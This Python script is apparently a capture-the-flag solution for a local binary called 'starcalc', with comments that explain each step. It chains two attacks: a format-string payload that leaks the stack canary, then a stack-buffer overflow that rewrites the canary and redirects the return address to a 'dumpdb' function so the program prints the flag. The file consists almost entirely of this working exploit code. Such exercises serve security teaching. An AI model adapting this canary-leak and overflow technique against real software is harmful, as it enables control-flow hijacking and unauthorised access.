#!/usr/bin/env python3
import subprocess
import re
import struct
import sys

#Function that reads a Byte (character) at a time and saves it on an accumulator (string) which will then be returned as soon as it contains a given pattern of characters
def read_until(stream, pattern):
	r=''
	while pattern not in r:
		b = stream.read(1).decode('latin1')
		print(b, end='')
		r+=b

	print('')
	return r

#Regex used to retrieve the canary.
re1 = re.compile('The mass of (.*) is .*')
#Running the 'starcalc' program
p = subprocess.Popen('./starcalc', stdin=subprocess.PIPE, stdout=subprocess.PIPE)

#Recalling the previous function to read the output generated by the program until it encounter the '>' character
input_starcalc = read_until(p.stdout, '> ')
#Exploit the first vulnerability present in the 'calc' function, that consists in writing a string as input containing a format directive that will allow us to print the canary in the vulnerable 'printf'. The format directive used allows to print, in hexadecimal, the 39th parameter saved into the stack, which corresponds to the canary. The reason why the canary is in the 39th position is bacause we have 64 + 64 Bytes of arrays, so 128 Bytes (32 words), plus we need to add the displacement of the position of the first array in the stack, which in this case matches at the 7th position (proceeds looking at GDB), so 32 + 7 = 39.
p.stdin.write(b'%39$08x'+b'\n')
p.stdin.flush()
#Recallign the previous function to read the output generated by the program until it encounter the '>' symbol
input_starcalc = read_until(p.stdout, '> ')
#Writing any string, since it will not exploit any benefit/leak (I just need to continue the program)
p.stdin.write(b'\n')
p.stdin.flush()

#Recalling the previous function to read the output generated by the program until I encounter a 'new-line' character
input_starcalc = read_until(p.stdout, '\n')
#In the string previously read there will be saved the canary (using printf without format directives) so through a regex it retrieve that
canary = re1.search(input_starcalc).group(1)

#Using the 'pack' function to write the canary in little endian format
pack = struct.pack('<L',int(canary,16))

#Recalling the previous function to read the output generated by the program until it encounter the '>' symbol (which will occur after a 'sleep')
input_starcalc = read_until(p.stdout, '> ')

#Exploiting the second vulnerability (stack overflow) present in the 'unlock_db' function, which consists in writing arbitrary characters to fill up the 'key' array (32 characters), then rewriting the canary, after that writing other arbitrary characters (displacement - In this case 12 character-long <- proceeds looking at GDB), and finally overwriting the address '0x08048c04' (which points to the IF construct) with the address, in little endianess, of the 'dumpdb' function. Basically the program will jump to that address (which corresponds to the first statement of the 'dumpdb' function) and it will provide the flag
p.stdin.write(b'A'*32+pack+b'A'*12+b'\x08\x04\x8b\x32'[::-1]+b'\n')
p.stdin.flush()

#Recalling the previous function to read and print the output generated by the program until the end (that contains also the flag)
while True:
	input_starcalc = read_until(p.stdout, '\n')